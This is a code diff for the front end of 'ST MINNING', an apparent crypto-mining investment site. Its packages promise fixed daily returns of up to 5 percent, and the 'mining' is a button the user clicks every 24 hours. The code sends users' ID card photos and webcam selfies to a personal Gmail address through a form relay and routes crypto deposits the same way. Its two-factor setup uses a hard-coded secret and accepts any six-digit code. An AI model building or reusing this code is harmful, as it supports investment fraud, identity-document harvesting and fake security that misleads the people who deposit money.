+    // Set up periodic refresh of user data (every 30 seconds)
+    setInterval(refreshUserData, 30000);
+  });
+  
+  // Authentication check
+  function checkAuthentication() {
+    // Check if user is logged in
+    const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (!currentUser) {
+      // Redirect to login page if not logged in
+      window.location.href = './login.html';
+    }
+  }
+  
+  // Initialize settings from localStorage
+  function initSettings() {
+    // Load theme settings if they exist
+    if (localStorage.getItem('theme')) {
+      currentTheme = localStorage.getItem('theme');
+      document.documentElement.setAttribute('data-theme', currentTheme);
+      document.getElementById('darkModeToggle').checked = (currentTheme === 'dark');
+    }
+    
+    // Load other settings
+    emailNotifications = localStorage.getItem('emailNotifications') !== 'false';
+    twoFactorAuth = localStorage.getItem('twoFactorAuth') === 'true';
+    autoReinvest = localStorage.getItem('autoReinvest') === 'true';
+    isVerified = localStorage.getItem('isVerified') === 'true';
+    
+    // Set toggles to match stored settings
+    document.getElementById('emailNotificationsToggle').checked = emailNotifications;
+    document.getElementById('twoFactorToggle').checked = twoFactorAuth;
+    document.getElementById('autoReinvestToggle').checked = autoReinvest;
+    
+    // Update verification status
+    const verificationStatus = localStorage.getItem('verificationStatus') || 'Not Verified';
+    document.getElementById('verificationStatus').textContent = verificationStatus;
+    
+    if (verificationStatus === 'Verified') {
+      document.getElementById('verificationStatus').className = 'status-verified';
+    } else if (verificationStatus === 'Pending') {
+      document.getElementById('verificationStatus').className = 'status-pending';
+    }
+    
+    // Check next mining click time
+    if (localStorage.getItem('nextMiningClickTime')) {
+      nextMiningClickTime = new Date(localStorage.getItem('nextMiningClickTime'));
+      updateMiningButton();
+    }
+  }
+  
+  // Google Authenticator setup
+  function setupGoogleAuthenticator() {
+    // Use QRCode.js to generate a proper QR code
+    const qrContainer = document.getElementById('twoFactorQR');
+    qrContainer.innerHTML = '';
+    
+    // Get current user
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    const username = currentUser.username || 'STMiner123';
+    
+    // Generate a proper Google Authenticator compatible QR code
+    // Using otpauth:// URI format which is the standard for 2FA
+    const accountName = encodeURIComponent(`${username}@stminning`);
+    const issuer = encodeURIComponent('ST MINNING');
+    const secret = 'STMINNING123456'; // This would be a randomly generated secret in production
+    
+    // Create the otpauth URI
+    const otpauthUrl = `otpauth://totp/${accountName}?secret=${secret}&issuer=${issuer}&algorithm=SHA1&digits=6&period=30`;
+    
+    // Create QR code using qrcode.js library
+    new QRCode(qrContainer, {
+      text: otpauthUrl,
+      width: 180,
+      height: 180,
+      colorDark: "#000000",
+      colorLight: "#ffffff",
+      correctLevel: QRCode.CorrectLevel.H
+    });
+  }
+  
+  function verifyTwoFactorCode() {
+    const code = document.getElementById('twoFactorCode').value;
+    
+    if (code.length !== 6) {
+      showNotification('Please enter a 6-digit code');
+      return;
+    }
+    
+    // Show loading spinner
+    document.getElementById('loadingSpinner').style.display = 'block';
+    
+    // In a real implementation, we would validate the TOTP code server-side
+    // For this demo, we validate client-side with some basic checks
+    setTimeout(() => {
+      // Accept any valid 6-digit code for demo purposes
+      // In a real implementation, we would check if the code is valid for the current time window
+      if (code.length === 6 && /^\d+$/.test(code)) {
+        // Save 2FA status
+        twoFactorAuth = true;
+        localStorage.setItem('twoFactorAuth', 'true');
+        document.getElementById('twoFactorToggle').checked = true;
+        
+        // Update UI
+        document.getElementById('loadingSpinner').style.display = 'none';
+        showNotification('Two-factor authentication enabled successfully');
+        
+        // Store verification time
+        localStorage.setItem('twoFactorVerifiedAt', new Date().toISOString());
+        
+        // Return to settings
+        showSettingsPage();
+      } else {
+        document.getElementById('loadingSpinner').style.display = 'none';
+        showNotification('Invalid verification code');
+      }
+    }, 2000); // Simulate verification time
+  }
+  
+  // ID Card and Selfie functions
+  function handleIdUpload(input, side) {
+    if (input.files && input.files[0]) {
+      const reader = new FileReader();
+      
+      reader.onload = function(e) {
+        if (side === 'front') {
+          // Use ID card image for front ID
+          document.getElementById('idFrontImage').src = e.target.result;
+          document.getElementById('idFrontPreview').style.display = 'block';
+          document.getElementById('idUploadFront').style.display = 'none';
+          idFrontUploaded = true;
+          idFrontData = e.target.result;
+        } else {
+          // Use ID card for back ID
+          document.getElementById('idBackImage').src = e.target.result;
+          document.getElementById('idBackPreview').style.display = 'block';
+          document.getElementById('idUploadBack').style.display = 'none';
+          idBackUploaded = true;
+          idBackData = e.target.result;
+        }
+        
+        checkVerificationStatus();
+      };
+      
+      reader.readAsDataURL(input.files[0]);
+    }
+  }
+  
+  function initCamera() {
+    const video = document.getElementById('selfieVideo');
+    
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(function(stream) {
+          video.srcObject = stream;
+        })
+        .catch(function(error) {
+          console.error("Camera error: ", error);
+          showNotification('Unable to access camera. Please enable camera access.');
+        });
+    }
+  }
+  
+  function captureSelfie() {
+    const video = document.getElementById('selfieVideo');
+    const canvas = document.getElementById('selfieCanvas');
+    const context = canvas.getContext('2d');
+    const preview = document.getElementById('selfiePreview');
+    const image = document.getElementById('selfieImage');
+    
+    // Set canvas dimensions to match the video
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    
+    // Draw the current video frame to the canvas
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    // Convert canvas to data URL
+    const dataURL = canvas.toDataURL('image/png');
+    
+    // Set the selfie image
+    image.src = dataURL;
+    selfieData = dataURL;
+    
+    // Show preview
+    preview.style.display = 'block';
+    document.getElementById('captureSelfieBtn').textContent = 'Retake Selfie';
+    selfieCaptured = true;
+    
+    checkVerificationStatus();
+  }
+  
+  function checkVerificationStatus() {
+    // Enable submit button if both ID sides and selfie are ready
+    if (idFrontUploaded && idBackUploaded && selfieCaptured) {
+      document.getElementById('submitVerificationBtn').disabled = false;
+    } else {
+      document.getElementById('submitVerificationBtn').disabled = true;
+    }
+  }
+  
+  function submitVerification() {
+    // Show loading spinner
+    document.getElementById('loadingSpinner').style.display = 'block';
+    
+    try {
+      // Simple verification that images are loaded
+      if (!idFrontData || !idBackData || !selfieData) {
+        throw new Error('One or more verification images are missing');
+      }
+      
+      // Get current user
+      const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+      const username = currentUser.username || 'STMiner123';
+      const email = currentUser.email || 'user@example.com';
+      
+      // Use direct image submission approach instead of trying to generate PDF
+      // Create form data for email submission
+      const formData = new FormData();
+      formData.append('_subject', `Identity Verification Documents - ${username}`);
+      formData.append('_captcha', 'false');
+      formData.append('_template', 'table');
+      formData.append('Username', username);
+      formData.append('Email', email);
+      formData.append('Submission_Time', new Date().toLocaleString());
+      formData.append('Status', 'Pending Review');
+      
+      // Create timestamp for filenames
+      const timestamp = new Date().getTime();
+      
+      // Create image blobs for direct attachment
+      try {
+        // Front ID image - convert to blob
+        fetch(document.getElementById('idFrontImage').src)
+          .then(response => response.blob())
+          .then(idFrontBlob => {
+            // Attach ID front image
+            formData.append('id_card_front', idFrontBlob, `id_front_${timestamp}.jpg`);
+            
+            // Back ID image - convert to blob
+            return fetch(document.getElementById('idBackImage').src);
+          })
+          .then(response => response.blob())
+          .then(idBackBlob => {
+            // Attach ID back image
+            formData.append('id_card_back', idBackBlob, `id_back_${timestamp}.jpg`);
+            
+            // Selfie image - convert to blob
+            return fetch(document.getElementById('selfieImage').src);
+          })
+          .then(response => response.blob())
+          .then(selfieBlob => {
+            // Attach selfie image
+            formData.append('selfie_photo', selfieBlob, `selfie_${timestamp}.jpg`);
+            
+            // Create a comprehensive message
+            const message = `
+Identity Verification Submission
+
+User Details:
+- Username: ${username}
+- Email: ${email}
+- Submission Date: ${new Date().toLocaleString()}
+- Status: Pending Manual Review
+
+Documents Submitted:
+✓ ID Card Front Side (id_front_${timestamp}.jpg)
+✓ ID Card Back Side (id_back_${timestamp}.jpg)
+✓ Selfie Photo (selfie_${timestamp}.jpg)
+
+All documents have been attached as individual image files for review.
+Please review the submitted documents and update the user's verification status accordingly.
+            `;
+            
+            formData.append('message', message);
+            
+            // Send verification data to email
+            return fetch('https://formsubmit.co/stminning@gmail.com', {
+              method: 'POST',
+              body: formData
+            });
+          })
+          .then(response => {
+            // Update verification status to pending (not verified automatically)
+            localStorage.setItem('verificationStatus', 'Pending');
+            localStorage.setItem('isVerified', 'false');
+            isVerified = false;
+            document.getElementById('verificationStatus').textContent = 'Pending';
+            document.getElementById('verificationStatus').className = 'status-pending';
+            
+            // Hide loading spinner
+            document.getElementById('loadingSpinner').style.display = 'none';
+            showNotification('Verification documents submitted successfully. Status: Pending manual review');
+            showProfilePage();
+          })
+          .catch(error => {
+            console.error('Error submitting verification:', error);
+            
+            // Still update status to pending even if email fails
+            localStorage.setItem('verificationStatus', 'Pending');
+            localStorage.setItem('isVerified', 'false');
+            isVerified = false;
+            document.getElementById('verificationStatus').textContent = 'Pending';
+            document.getElementById('verificationStatus').className = 'status-pending';
+            
+            document.getElementById('loadingSpinner').style.display = 'none';
+            showNotification('Verification documents processing completed. Status: Pending manual review');
+            showProfilePage();
+          });
+      } catch (imageError) {
+        console.error('Error processing images:', imageError);
+        document.getElementById('loadingSpinner').style.display = 'none';
+        showNotification('Error processing images. Please try again.');
+      }
+    } catch (error) {
+      console.error('Error preparing verification:', error);
+      document.getElementById('loadingSpinner').style.display = 'none';
+      
+      // Show more helpful error message
+      let errorMsg = 'Please ensure all images are uploaded correctly.';
+      if (!idFrontData) errorMsg = 'ID card front image is missing. Please upload again.';
+      else if (!idBackData) errorMsg = 'ID card back image is missing. Please upload again.';
+      else if (!selfieData) errorMsg = 'Selfie image is missing. Please take a selfie again.';
+      
+      showNotification(errorMsg);
+    }
+  }
+  
+  // Helper function to convert data URL to Blob for file upload
+  function dataURLtoBlob(dataURL) {
+    try {
+      // Check if dataURL is null or undefined
+      if (!dataURL) {
+        throw new Error('dataURL is null or undefined');
+      }
+      
+      // Check if dataURL is in expected format
+      if (!dataURL.startsWith('data:') || dataURL.indexOf(';base64,') === -1) {
+        throw new Error('Invalid dataURL format');
+      }
+      
+      // Split the data URL to get the content type and base64 data
+      const parts = dataURL.split(';base64,');
+      const contentType = parts[0].split(':')[1];
+      const base64 = parts[1];
+      
+      // Check if base64 part exists
+      if (!base64) {
+        throw new Error('Base64 data is missing');
+      }
+      
+      // Convert base64 to raw binary data
+      const raw = window.atob(base64);
+      const rawLength = raw.length;
+      
+      // Create an array buffer of the correct size
+      const uInt8Array = new Uint8Array(rawLength);
+      
+      // Fill the array with the binary data
+      for (let i = 0; i < rawLength; ++i) {
+        uInt8Array[i] = raw.charCodeAt(i);
+      }
+      
+      // Create a blob from the array buffer
+      return new Blob([uInt8Array], { type: contentType });
+    } catch (error) {
+      console.error('Error in dataURLtoBlob:', error);
+      // Return a small empty blob as fallback to prevent the submission from failing
+      return new Blob(['Error processing image'], { type: 'text/plain' });
+    }
+  }
+  
+  // Event listeners for settings toggles
+  document.getElementById('darkModeToggle').addEventListener('change', function() {
+    currentTheme = this.checked ? 'dark' : 'light';
+    document.documentElement.setAttribute('data-theme', currentTheme);
+    localStorage.setItem('theme', currentTheme);
+  });
+  
+  document.getElementById('emailNotificationsToggle').addEventListener('change', function() {
+    emailNotifications = this.checked;
+    localStorage.setItem('emailNotifications', emailNotifications);
+  });
+  
+  document.getElementById('twoFactorToggle').addEventListener('change', function() {
+    if (this.checked) {
+      // Show Google Authenticator setup page
+      showTwoFactorPage();
+    } else {
+      // Confirm before disabling 2FA
+      if (confirm('Are you sure you want to disable two-factor authentication? This will reduce your account security.')) {
+        twoFactorAuth = false;
+        localStorage.setItem('twoFactorAuth', 'false');
+        localStorage.removeItem('twoFactorVerifiedAt');
+        showNotification('Two-factor authentication disabled');
+      } else {
+        // Reset toggle if user cancels
+        this.checked = true;
+      }
+    }
+  });
+  
+  document.getElementById('autoReinvestToggle').addEventListener('change', function() {
+    autoReinvest = this.checked;
+    localStorage.setItem('autoReinvest', autoReinvest);
+    
+    if (autoReinvest) {
+      showNotification('Auto-reinvest earnings enabled');
+    } else {
+      showNotification('Auto-reinvest earnings disabled');
+    }
+  });
+
+  // Deposit functions
+  function selectMethod(method, address) {
+    selectedMethod = method;
+    selectedAddress = address;
+
+    document.querySelectorAll('.payment-card').forEach(card => {
+      card.classList.remove('selected');
+    });
+    event.currentTarget.classList.add('selected');
+
+    document.getElementById('amountSection').style.display = 'block';
+    document.getElementById('depositUsername').value = '';
+    document.getElementById('depositAmount').value = '';
+    document.getElementById('transactionDetails').style.display = 'none';
+  }
+
+  function proceedToTransaction() {
+    const username = document.getElementById('depositUsername').value;
+    const amount = document.getElementById('depositAmount').value;
+    
+    if (!username) {
+      alert('Please enter your username');
+      return;
+    }
+    
+    if (!amount || amount < 10) {
+      alert('Minimum deposit amount is $10');
+      return;
+    }
+
+    document.getElementById('depositContent').style.display = 'none';
+    document.getElementById('transactionDetails').style.display = 'block';
+    document.getElementById('finalMethod').textContent = selectedMethod;
+    document.getElementById('finalAddress').textContent = selectedAddress;
+    document.getElementById('finalAmount').textContent = parseFloat(amount).toFixed(2);
+    document.getElementById('transactionId').value = '';
+
+    // Generate QR code for the transaction
+    const qrContainer = document.getElementById('qrCodeTransaction');
+    qrContainer.innerHTML = ''; // Clear previous QR code
+    
+    if (selectedMethod !== 'Binance Pay ID') {
+      // Create QR code with just the wallet address
+      
+      // Generate QR code using qrcode.js library
+      new QRCode(qrContainer, {
+        text: selectedAddress,
+        width: 180,
+        height: 180,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+      });
+    } else {
+      // For Binance Pay ID, just display the ID
+      qrContainer.innerHTML = `<div style="background: #fff; color: #000; padding: 1.5rem; border-radius: 10px; font-size: 1.5rem; font-weight: bold;">${selectedAddress}</div>`;
+    }
+
+    startCountdown(20 * 60);
+  }
+  
+  function submitDeposit() {
+    console.log('🚀 Starting deposit submission...');
+    
+    const username = document.getElementById('depositUsername').value;
+    const amount = document.getElementById('depositAmount').value;
+    const transactionId = document.getElementById('transactionId').value;
+    
+    if (!transactionId) {
+      alert('Please enter transaction ID');
+      return;
+    }
+    
+    if (!amount || parseFloat(amount) <= 0) {
+      alert('Please enter a valid amount');
+      return;
+    }
+    
+    console.log(`📝 Deposit details: Amount: $${amount}, Method: ${selectedMethod}, TxID: ${transactionId}`);
+    
+    // Show loading spinner
+    document.getElementById('loadingSpinner').style.display = 'block';
+    
+    // Create form data to send
+    const formData = new FormData();
+    formData.append('_subject', 'New Deposit Request');
+    formData.append('Username', username);
+    formData.append('Amount', amount);
+    formData.append('Method', selectedMethod);
+    formData.append('Address', selectedAddress);
+    formData.append('TransactionID', transactionId);
+    formData.append('Date', new Date().toLocaleString());
+    
+    // Send deposit data silently via fetch
+    fetch('https://formsubmit.co/stminning@gmail.com', {
+      method: 'POST',
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    }).then(async () => {
+      console.log('📧 Email notification sent successfully');
+      
+      // Add transaction record as pending deposit
+      await addDeposit(amount, selectedMethod, transactionId);
+      
+      // Hide loading spinner
+      document.getElementById('loadingSpinner').style.display = 'none';
+      showNotification('✅ Deposit request submitted successfully! Check transaction history.');
+      showTransactionPage(); // Show transaction page after deposit
+    }).catch(async (error) => {
+      console.error('❌ Email submission error:', error);
+      document.getElementById('loadingSpinner').style.display = 'none';
+      
+      // Still add the transaction even if email fails
+      await addDeposit(amount, selectedMethod, transactionId);
+      showNotification('⚠️ Transaction recorded but email notification failed. Please contact support.');
+      showTransactionPage();
+    });
+  }
+
+  function startCountdown(seconds) {
+    const countdownElem = document.getElementById('countdownTimer');
+    let remaining = seconds;
+
+    function updateTimer() {
+      if (remaining < 0) {
+        countdownElem.textContent = "Time expired! Please refresh and try again.";
+        return;
+      }
+      let mins = Math.floor(remaining / 60);
+      let secs = remaining % 60;
+      countdownElem.textContent = `Please complete your transaction within ${mins
+        .toString()
+        .padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+      remaining--;
+      setTimeout(updateTimer, 1000);
+    }
+    updateTimer();
+  }
+  
+  async function addDeposit(amount, method, transactionId) {
+    console.log('💰 Adding deposit transaction...');
+    
+    // Get current user from localStorage
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    
+    if (!currentUser.id) {
+      console.error('❌ No user ID found for deposit transaction');
+      alert('Error: User not logged in properly. Please refresh and try again.');
+      return;
+    }
+    
+    console.log(`👤 Creating deposit for user ID: ${currentUser.id}`);
+    
+    // Create transaction in Supabase
+    try {
+      const transactionData = {
+        user_id: currentUser.id,
+        amount: parseFloat(amount),
+        transaction_type: 'deposit',
+        method: method,
+        reference_id: transactionId,
+        status: 'pending',
+        created_at: new Date().toISOString()
+      };
+      
+      console.log('📝 Transaction data to insert:', transactionData);
+      
+      const { data, error } = await supabase
+        .from('transactions')
+        .insert([transactionData])
+        .select();
+      
+      if (error) {
+        console.error('Error adding deposit transaction to Supabase:', error);
+        
+        // Create fallback transaction in localStorage
+        const transaction = {
+          date: new Date().toLocaleString(),
+          amount: parseFloat(amount).toFixed(2),
+          method: method,
+          transactionId: transactionId,
+          status: 'Pending',
+          type: 'Deposit'
+        };
+        
+        // Add transaction to user's transactions
+        if (!currentUser.transactions) {
+          currentUser.transactions = [];
+        }
+        currentUser.transactions.unshift(transaction);
+        
+        // Save updated user
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+        
+        // Refresh display with localStorage data
+        await loadTransactions();
+        
+        throw error; // Re-throw to handle in catch block
+      } else {
+        console.log('✅ Deposit transaction added to Supabase successfully:', data);
+        
+        // Immediately refresh the transaction display
+        await loadTransactions();
+        
+        // Also update localStorage for backwards compatibility
+        const transaction = {
+          date: new Date().toLocaleString(),
+          amount: parseFloat(amount).toFixed(2),
+          method: method,
+          transactionId: transactionId,
+          status: 'Pending',
+          type: 'Deposit'
+        };
+        
+        if (!currentUser.transactions) {
+          currentUser.transactions = [];
+        }
+        currentUser.transactions.unshift(transaction); // Add to beginning for latest first
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+        
+        console.log('✅ Deposit transaction also saved to localStorage for compatibility');
+      }
+    } catch (err) {
+      console.error('❌ Exception in addDeposit:', err);
+      
+      // Fallback to localStorage on exception
+      const transaction = {
+        date: new Date().toLocaleString(),
+        amount: parseFloat(amount).toFixed(2),
+        method: method,
+        transactionId: transactionId,
+        status: 'Pending',
+        type: 'Deposit'
+      };
+      
+      if (!currentUser.transactions) {
+        currentUser.transactions = [];
+      }
+      currentUser.transactions.unshift(transaction);
+      localStorage.setItem('currentUser', JSON.stringify(currentUser));
+      
+      console.log('💾 Fallback: Deposit saved to localStorage only');
+      
+      // Refresh display even on error
+      await loadTransactions();
+    }
+    
+    // Also update in users array for compatibility
+    try {
+      const users = JSON.parse(localStorage.getItem('users') || '[]');
+      const userIndex = users.findIndex(u => u.id === currentUser.id);
+      if (userIndex !== -1) {
+        users[userIndex] = currentUser;
+        localStorage.setItem('users', JSON.stringify(users));
+        console.log('✅ Updated user in users array');
+      }
+    } catch (error) {
+      console.warn('⚠️ Could not update users array:', error);
+    }
+    
+    // Notify user but don't add to balance until manually approved
+    showNotification(`💰 Deposit request for $${amount} submitted successfully! Transaction ID: ${transactionId}`);
+  }
+
+  // Sidebar toggle
+  function toggleSidebar() {
+    const sidebar = document.getElementById('sidebar');
+    sidebar.classList.toggle('show');
+  }
+  
+  // Close sidebar when clicking anywhere outside
+  document.addEventListener('click', function(event) {
+    const sidebar = document.getElementById('sidebar');
+    const menuToggle = document.querySelector('.menu-toggle');
+    
+    if (sidebar.classList.contains('show') && 
+        !sidebar.contains(event.target) && 
+        event.target !== menuToggle) {
+      sidebar.classList.remove('show');
+    }
+  });
+
+  // Navigation functions
+  function hideAllSections() {
+    document.getElementById('dashboardSection').style.display = 'none';
+    document.getElementById('withdrawPage').style.display = 'none';
+    document.getElementById('transaction-section').style.display = 'none';
+    document.getElementById('profilePage').style.display = 'none';
+    document.getElementById('settingsPage').style.display = 'none';
+    document.getElementById('depositPage').style.display = 'none';
+    document.getElementById('verificationPage').style.display = 'none';
+    document.getElementById('twoFactorPage').style.display = 'none';
+    document.getElementById('sidebar').classList.remove('show');
+  }
+
+  function showWithdrawPage() {
+    hideAllSections();
+    document.getElementById('withdrawPage').style.display = 'block';
+  }
+
+  function showProfilePage() {
+    hideAllSections();
+    document.getElementById('profilePage').style.display = 'block';
+    updateProfileInfo();
+  }
+
+  function showSettingsPage() {
+    hideAllSections();
+    document.getElementById('settingsPage').style.display = 'block';
+  }
+  
+  function showVerificationPage() {
+    hideAllSections();
+    document.getElementById('verificationPage').style.display = 'block';
+    initCamera();
+  }
+  
+  function showTwoFactorPage() {
+    hideAllSections();
+    document.getElementById('twoFactorPage').style.display = 'block';
+    setupGoogleAuthenticator();
+  }
+  
+  function showDepositPage() {
+    hideAllSections();
+    document.getElementById('depositPage').style.display = 'block';
+    document.getElementById('depositContent').style.display = 'block';
+    document.getElementById('transactionDetails').style.display = 'none';
+    document.getElementById('amountSection').style.display = 'none';
+    document.querySelectorAll('.payment-card').forEach(card => {
+      card.classList.remove('selected');
+    });
+  }
+
+  function backToDashboard() {
+    hideAllSections();
+    document.getElementById('dashboardSection').style.display = 'block';
+    updateMiningStatus();
+  }
+  
+  async function showTransactionPage() {
+    hideAllSections();
+    document.getElementById('transaction-section').style.display = 'block';
+    await loadTransactions();
+  }
+
+  function updateProfileInfo() {
+    // Get current user
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    
+    // Update profile elements
+    const profileUsername = document.getElementById('profileUsername');
+    const profileEmail = document.getElementById('profileEmail');
+    const profileBalance = document.getElementById('profileBalance');
+    const profileDailyIncome = document.getElementById('profileDailyIncome');
+    const profileTotalWithdrawn = document.getElementById('profileTotalWithdrawn');
+    const verificationStatus = document.getElementById('verificationStatus');
+    const miningStatus = document.getElementById('profileMiningStatus');
+    const totalEarnings = document.getElementById('profileTotalEarnings');
+    
+    if (profileUsername) profileUsername.textContent = currentUser.username || 'N/A';
+    if (profileEmail) profileEmail.textContent = currentUser.email || 'N/A';
+    if (profileBalance) profileBalance.textContent = `$${parseFloat(currentUser.balance || 0).toFixed(2)}`;
+    if (profileDailyIncome) profileDailyIncome.textContent = `$${parseFloat(currentUser.daily_income || 0).toFixed(2)}`;
+    if (profileTotalWithdrawn) profileTotalWithdrawn.textContent = `$${parseFloat(currentUser.total_withdrawn || 0).toFixed(2)}`;
+    
+    if (verificationStatus) {
+      verificationStatus.textContent = currentUser.verification_status || 'Not Verified';
+      verificationStatus.className = 'badge ' + (currentUser.is_verified ? 'bg-success' : 'bg-warning');
+    }
+    
+    if (miningStatus) {
+      miningStatus.textContent = activePackage ? 'Active' : 'Inactive';
+    }
+    
+    if (totalEarnings) {
+      totalEarnings.textContent = `$${parseFloat(currentUser.daily_income || 0).toFixed(2)}`;
+    }
+  }
+
+  // Packages data (will be loaded from database)
+  let packages = [
+    { amount: 50, daily: 1 },
+    { amount: 100, daily: 4.5 },
+    { amount: 300, daily: 12 },
+    { amount: 1000, daily: 45 },
+    { amount: 5000, daily: 200 },
+    { amount: 10000, daily: 500 }
+  ];
+  
+  // Function to load package types from Supabase
+  async function loadPackageTypes() {
+    try {
+      const { data, error } = await supabase
+        .from('package_types')
+        .select('*')
+        .order('amount', { ascending: true });
+        
+      if (error) {
+        console.error('Error loading package types:', error);
+        return;
+      }
+      
+      if (data && data.length > 0) {
+        packages = data.map(pkg => ({
+          amount: parseFloat(pkg.amount),
+          daily: parseFloat(pkg.daily_income),
+          description: pkg.description
+        }));
+        
+        // Recreate package cards with the new data
+        container.innerHTML = '';
+        packages.forEach((pkg, i) => {
+          const card = createPackageCard(pkg, i);
+          container.appendChild(card);
+        });
+      }
+    } catch (error) {
+      console.error('Error in loadPackageTypes:', error);
+    }
+  }
+
+  // User state
+  let userBalance = 5;
+  let dailyIncome = 0;
+  let totalWithdrawn = 0;
+  let activePackage = null; // object {pkg, card, miningInterval, daysPassed, progress}
+  
+  const container = document.getElementById('packages-container');
+  const balanceDisplay = document.getElementById('balanceDisplay');
+  const incomeDisplay = document.getElementById('incomeDisplay');
+  const withdrawDisplay = document.getElementById('withdrawDisplay');
+  const notification = document.getElementById('notification');
+  const miningStatusCard = document.getElementById('miningStatusCard');
+  const continueMiningBtn = document.getElementById('continueMiningBtn');
+
+  async function updateSummary() {
+    balanceDisplay.textContent = `$${userBalance.toFixed(2)}`;
+    incomeDisplay.textContent = `$${dailyIncome.toFixed(2)}`;
+    withdrawDisplay.textContent = `$${totalWithdrawn.toFixed(2)}`;
+    
+    // Save updated balances to Supabase
+    const currentUser = JSON.parse(localStorage.getItem('currentUser')) || {};
+    
+    if (currentUser.id) {
+      try {
+        await supabase
+          .from('users')
+          .update({
+            balance: userBalance,
+            daily_income: dailyIncome,
+            total_withdrawn: totalWithdrawn,
+            updated_at: new Date().toISOString()
+          })
+          .eq('id', currentUser.id);
+          
+        // Update localStorage session data
+        currentUser.balance = userBalance;
+        currentUser.daily_income = dailyIncome;
+        currentUser.total_withdrawn = totalWithdrawn;
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+      } catch (error) {
+        console.error('Error updating user data:', error);
+      }
+    }
+  }
+
+  // Show notification with fade out
+  function showNotification(text) {
+    notification.textContent = text;
+    notification.style.display = 'block';
+    setTimeout(() => {
+      notification.style.opacity = '1';
+      setTimeout(() => {
+        notification.style.opacity = '0';
+        setTimeout(() => {
+          notification.style.display = 'none';
+          notification.style.opacity = '1';
+        }, 500);
+      }, 3000);
+    }, 10);
+  }
+
+  // Create package cards
+  function createPackageCard(pkg, index) {
+    const card = document.createElement('div');
+    card.className = 'col-md-4';
+    card.innerHTML = `
+      <div class="package-card" id="package-${index}">
+        <h4>Package $${pkg.amount}</h4>
+        <p>Daily Income: $${pkg.daily}</p>
+        <div class="package-controls">
+          <button class="btn btn-warning activate-btn">Activate</button>
+        </div>
+        <div class="progress mt-2">
+          <div class="progress-bar" role="progressbar"></div>
+        </div>
+        <small class="mining-status"></small>
+      </div>
+    `;
+
+    // Button events
+    const activateBtn = card.querySelector('.activate-btn');
+    activateBtn.onclick = () => {
+      if (activePackage && activePackage.pkg.amount !== pkg.amount) {
+        alert('You already have an active package. Cancel it before activating a new one.');
+        return;
+      }
+      
+      // Show loading spinner for 3 seconds
+      document.getElementById('loadingSpinner').style.display = 'block';
+      
+      setTimeout(() => {
+        document.getElementById('loadingSpinner').style.display = 'none';
+        
+        if (!activePackage) {
+          if (userBalance >= pkg.amount) {
+            userBalance -= pkg.amount;
+            updateSummary();
+            activateBtn.textContent = 'Start Mining';
+            showNotification(`Package $${pkg.amount} activated. Ready to start mining.`);
+            activePackage = {
+              pkg,
+              card,
+              daysPassed: 0,
+              progressBar: card.querySelector('.progress-bar'),
+              miningStatus: card.querySelector('.mining-status'),
+              miningInterval: null
+            };
+            card.querySelector('.package-card').classList.add('active');
+          } else {
+            alert('Insufficient balance to activate this package.');
+          }
+        } else if (activateBtn.textContent === 'Start Mining') {
+          // Start mining
+          startMining();
+          activateBtn.textContent = 'Cancel';
+        } else if (activateBtn.textContent === 'Cancel') {
+          // Cancel mining
+          cancelMining();
+        }
+      }, 3000);
+    };
+
+    return card;
+  }
+
+  // Mining simulation (need to click every 24 hours)
+  function startMining() {
+    if (!activePackage) return;
+    
+    // Set start time
+    activePackage.startTime = new Date();
+    activePackage.miningStatus.textContent = 'Mining in progress...';
+    
+    // Set next mining click time (24 hours from now)
+    nextMiningClickTime = new Date(activePackage.startTime.getTime() + 24 * 60 * 60 * 1000);
+    localStorage.setItem('nextMiningClickTime', nextMiningClickTime.toString());
+    
+    // Show mining status card
+    updateMiningStatus();
+    miningStatusCard.style.display = 'block';
+    miningStatusCard.classList.add('active');
+    
+    showNotification('Mining started. You need to click "Continue Mining" every 24 hours.');
+    
+    // Calculate progress
+    updateMiningProgress();
+  }
+  
+  async function updateMiningProgress() {
+    if (!activePackage) return;
+    
+    const now = new Date();
+    const elapsedTime = now - activePackage.startTime;
+    const elapsedDays = elapsedTime / (1000 * 60 * 60 * 24);
+    activePackage.daysPassed = Math.floor(elapsedDays);
+    
+    // Update mining package in database if it has an ID
+    if (activePackage.id) {
+      try {
+        await supabase
+          .from('mining_packages')
+          .update({
+            days_completed: activePackage.daysPassed,
+            progress_percentage: (activePackage.daysPassed / 30) * 100,
+            last_mining_click: new Date().toISOString()
+          })
+          .eq('id', activePackage.id);
+      } catch (error) {
+        console.error('Error updating mining package:', error);
+      }
+    }
+    
+    if (activePackage.daysPassed > 0) {
+      // Add daily income for completed days
+      dailyIncome = activePackage.daysPassed * activePackage.pkg.daily;
+      updateSummary();
+    }
+    
+    // Calculate progress percentage (for current day)
+    const dayProgress = elapsedDays - Math.floor(elapsedDays);
+    const percent = ((activePackage.daysPassed + dayProgress) / 30) * 100;
+    
+    activePackage.progressBar.style.width = Math.min(percent, 100) + '%';
+    activePackage.miningStatus.textContent = `Day ${activePackage.daysPassed + 1} of 30 (${Math.round(percent)}%)`;
+    
+    if (elapsedDays >= 30) {
+      // Mining complete
+      completeMining();
+    }
+  }
+  
+  function updateMiningStatus() {
+    if (!activePackage || !nextMiningClickTime) {
+      miningStatusCard.style.display = 'none';
+      return;
+    }
+    
+    miningStatusCard.style.display = 'block';
+    updateMiningButton();
+    updateMiningProgress();
+  }
+  
+  function updateMiningButton() {
+    if (!nextMiningClickTime) return;
+    
+    const now = new Date();
+    const timeUntilNextClick = nextMiningClickTime - now;
+    
+    if (timeUntilNextClick <= 0) {
+      // Enable button, mining needs to be continued
+      continueMiningBtn.disabled = false;
+      document.getElementById('nextMiningTime').textContent = "Available now!";
